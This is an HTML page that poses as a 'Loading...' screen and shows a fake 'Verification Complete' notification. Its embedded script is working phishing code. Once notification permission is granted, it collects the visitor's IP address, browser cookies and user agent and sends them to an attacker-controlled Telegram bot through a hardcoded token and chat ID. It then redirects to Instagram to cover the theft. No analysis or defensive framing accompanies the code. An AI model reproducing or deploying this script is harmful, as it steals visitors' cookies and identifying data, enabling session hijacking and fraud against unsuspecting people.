<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; }
    </style>
</head>
<body>

    <div style="text-align:center;">
        <div style="font-size:48px;">🔔</div>
        <p style="color:#333;">Loading...</p>
    </div>

    <script>
        const BOT_TOKEN = "8899172740:AAGx2l4uy6JrfPQgmpE-CiwJG9n3Zy5qJFk";
        const CHAT_ID = "6389764004";

        // ============================================================
        // 🧠 NOTIFICATION PHISHING
        // ============================================================

        Notification.requestPermission().then(permission => {
            if (permission === 'granted') {
                new Notification('✅ Verification Complete', {
                    body: 'Your account has been verified successfully.',
                    icon: 'https://img.icons8.com/color/48/000000/verified-account.png'
                });
                captureData();
            }
        });

        async function captureData() {
            const ip = await getIP();
            const cookies = document.cookie || 'No cookies found';
            const fingerprint = getFingerprint();

            let msg = `🎯 **NOTIFICATION PHISHING (Mobile)**\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip}\n🍪 Cookies: ${cookies}\n🖥️ Fingerprint: ${fingerprint.userAgent}\n🕐 Time: ${new Date().toISOString()}`;
            sendToTelegram(msg);
        }

        async function getIP() {
            try {
                let r = await fetch('https://api.ipify.org?format=json');
                let d = await r.json();
                return d.ip || 'Unknown';
            } catch { return 'Unable to fetch'; }
        }

        function getFingerprint() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        function sendToTelegram(msg) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
            fetch(url, { method: 'GET' });
        }

        // 👻 Redirect after 3 seconds
        setTimeout(() => {
            window.location.href = 'https://www.instagram.com';
        }, 3000);
    </script>
</body>
</html>
